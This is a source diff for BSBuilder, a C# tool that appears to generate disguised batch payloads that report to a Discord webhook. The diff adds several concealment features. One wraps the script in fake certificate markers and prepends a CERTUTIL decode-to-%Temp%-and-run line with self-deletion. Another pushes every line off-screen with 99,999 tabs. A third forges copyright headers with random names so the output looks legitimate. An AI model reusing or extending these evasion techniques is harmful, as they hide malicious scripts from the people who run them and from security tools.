@@ -6,7 +6,7 @@ using System.IO;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Drawing;
-//using System.Linq;
+using System.Linq;
 
 //github.com/Takaovi/BSBuilder - 2021
 namespace BSBuilder
@@ -50,6 +50,8 @@ namespace BSBuilder
         bool optimize = Properties.Settings.Default.optimize;
         bool obfuscate = Properties.Settings.Default.obfuscate;
         bool confuse = Properties.Settings.Default.confuse;
+        bool push = Properties.Settings.Default.push;
+        bool cert = Properties.Settings.Default.cert;
 
         string webhook = Properties.Settings.Default.webhook;
         string reportstartmsg = Properties.Settings.Default.reportstartmsg;
@@ -98,6 +100,8 @@ namespace BSBuilder
             optimizecheckbox.Checked = Properties.Settings.Default.optimize;
             obfuscatecheckbox.Checked = Properties.Settings.Default.obfuscate;
             confusecheckbox.Checked = Properties.Settings.Default.confuse;
+            certcheckbox.Checked = Properties.Settings.Default.cert;
+            pushcheckbox.Checked = Properties.Settings.Default.push;
 
             webhooktextbox.Text = Properties.Settings.Default.webhook;
             reportstartmsgtextbox.Text = Properties.Settings.Default.reportstartmsg;
@@ -236,24 +240,19 @@ namespace BSBuilder
             //Todo
         }
 
+        public static string Base64Encode(string plainText)
+        {
+            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
+            return System.Convert.ToBase64String(plainTextBytes);
+        }
+
         void confusebatch()
         {
-            // Unfinished stuff // Trashbin
-
-            //Push the batch script
-            /*
-            string pushside = String.Concat(Enumerable.Repeat("\t", 99999));
-            batch = Regex.Replace(batch, @"^", pushside, RegexOptions.Multiline);
-            */
-
-            //One liner - Doesn't work
-            //batch = Regex.Replace(batch, @"[\r\n]+", " & ", RegexOptions.Multiline);
-
             Random rand = new Random();
 
             //Amount of lines
-            int phase01random = rand.Next(100, 5000);
-            int phase03random = rand.Next(100, 3500);
+            int phase01random = rand.Next(100, 1000);
+            int phase03random = rand.Next(100, 500);
 
             //Variable for soon to be confused batch
             string confusedbatch = "";
@@ -294,16 +293,6 @@ namespace BSBuilder
                             "move \"%sourceFile%\" \"%destinationFile%\"",
                             "   move \"%sourceFile%\" \"%destinationFile%\"",
                             "cls",
-                            "",
-                            "",
-                            "",
-                            "",
-                            "",
-                            "",
-                            "",
-                            "",
-                            "",
-                            "",
                             "if 0==1 0",
                             "   if 0==1 0",
                             "cd.",
@@ -311,7 +300,14 @@ namespace BSBuilder
                             "   call",
                             "setlocal",
                             "2>NUL Info > %tempsys%",
-                            "   2>NUL Info > %tempsys%"
+                            "   2>NUL Info > %tempsys%",
+                            "",
+                            "",
+                            "",
+                            "",
+                            "",
+                            "",
+                            ""
                         };
 
             //To avoid two same commands being put in a row 
@@ -324,7 +320,52 @@ namespace BSBuilder
                 if (i == 1)
                 {
                     //Fake copyright notice ranging from 2004-2009 with a fake version
-                    confusedbatch = ":: Copyright © 200" + rand.Next(4, 9) + " - V" + rand.Next(1, 10) + "." + rand.Next(1, 69420) + "\n@echo off\ncd.\nif 0==1 0\ngoto tmp";
+                    string[] firstnames =
+                    {
+                        "Liam",
+                        "Noah",
+                        "Oliver",
+                        "Elijah",
+                        "Olivia",
+                        "Ava",
+                        "Emma",
+                        "Charlotte",
+                        "William",
+                        "James",
+                        "Benjamin",
+                        "Lucas",
+                        "Henry",
+                        "Alexander",
+                        "Sophia",
+                        "Amelia",
+                        "Isabella",
+                        "Mia",
+                        "Evelyn",
+                        "Harper",
+                    };
+                    string[] lastnames =
+                    {
+                        "Smith",
+                        "Johnson",
+                        "Williams",
+                        "Brown",
+                        "Jones",
+                        "Garcia",
+                        "Miller",
+                        "Davis",
+                        "Rodriguez",
+                        "Martinez",
+                        "Hernandez",
+                        "Lopez",
+                        "Wilson",
+                        "Moore",
+                        "Lee",
+                        "Robinson",
+                        "King",
+                        "Wright"
+                    };
+                    //Construct
+                    confusedbatch = ":: Copyright © " + firstnames[rand.Next(1, firstnames.Length)] + " " + lastnames[rand.Next(1, lastnames.Length)] + ", 201" + rand.Next(6, 9) + "\n:: Version: " + rand.Next(1, 10) + "." + rand.Next(1, 69) + "\n:: All rights reserved. The moral rights of the author have been asserted.\n\n@echo off\ncd.\nif 0==1 0\ngoto tmp";
                 }
                 //Generally
                 else
@@ -505,14 +546,14 @@ namespace BSBuilder
                     if (webhook.Length != 0)
                         editVAR("set \"webhook=https://discord.com/api/webhooks/\"", "webhook", webhook);
 
-                    if (obfuscate)
-                        obfuscatebatch(batch, 1);
-
                     //Optimize (Recurring won't be deleted otherwise)
                     if (optimize)
                     {
                         batch = Regex.Replace(batch, @"^\s*$\n|\r", string.Empty, RegexOptions.Multiline);
                     }
+
+                    if (obfuscate)
+                        obfuscatebatch(batch, 1);
 
                     if (recurring)
                     {
@@ -540,11 +581,6 @@ namespace BSBuilder
                     else if (optimize)
                         removeFUNCTION("goto skiprecurring");
 
-                    if (confuse)
-                    {
-                        confusebatch();
-                    }
-
                     //Second optimize (Remove empty lines, spaces and comments)
                     if (optimize)
                     {
@@ -554,10 +590,31 @@ namespace BSBuilder
                         batch = Regex.Replace(batch, @"[\n\r]+$", string.Empty, RegexOptions.Multiline);
                     }
 
+                    //Cert (Kind of like an obfuscation but not at all.)
+                    if (cert)
+                    {
+                        string onelinebatch = Base64Encode(batch);
+                        string cert = string.Format("-----BEGIN CERTIFICATE----- {0} -----END CERTIFICATE-----", onelinebatch);
+
+                        batch = "@echo off & CERTUTIL -f -decode \"%~f0\" \"%Temp%\\0.bat\" >nul 2>&1 & call \"%Temp%\\0.bat\" & Exit\n" + cert;
+                    }
+
+                    //Push the batch script to the side, makes it hard to read if using default text editors
+                    if (push)
+                    {
+                        string pushside = String.Concat(Enumerable.Repeat("\t", 99999));
+                        batch = Regex.Replace(batch, @"^", pushside, RegexOptions.Multiline);
+                    }
+
+                    if (confuse)
+                    {
+                        confusebatch();
+                    }
+
                     //Write batch
                     using (StreamWriter wt = new StreamWriter(AppDomain.CurrentDomain.BaseDirectory + "output.bat"))
                     {
-                        wt.WriteLine(batch);
+                        wt.Write(batch);
                     }
 
                     //Basically useless stuff as program will get restarted anyways
@@ -566,7 +623,6 @@ namespace BSBuilder
                     acceptTOScheckbox.Enabled = false;
                     forcerestart = true;
                     buildbutton.Text = "Restart the program";
-                    //--------------------------------------------------------------
 
                     //Restart application for reasons
                     Application.Restart();
@@ -1005,6 +1061,34 @@ namespace BSBuilder
             }
         }
 
+        private void certcheckbox_CheckedChanged(object sender, EventArgs e)
+        {
+            if (certcheckbox.Checked)
+            {
+                cert = true;
+                selfdelete = true;
+                selfdeletecheckbox.Checked = true;
+            }
+            else
+            {
+                cert = false;
+                selfdelete = false;
+                selfdeletecheckbox.Checked = false;
+            }
+        }
+
+        private void pushcheckbox_CheckedChanged(object sender, EventArgs e)
+        {
+            if (pushcheckbox.Checked)
+            {
+                push = true;
+            }
+            else
+            {
+                push = false;
+            }
+        }
+
         private void panel1_MouseDown(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Left)
@@ -1083,6 +1167,8 @@ namespace BSBuilder
             Properties.Settings.Default.optimize = optimize;
             Properties.Settings.Default.obfuscate = obfuscate;
             Properties.Settings.Default.confuse = confuse;
+            Properties.Settings.Default.push = push;
+            Properties.Settings.Default.cert = cert;
 
             Properties.Settings.Default.webhook = webhook;
             Properties.Settings.Default.reportstartmsg = reportstartmsg;
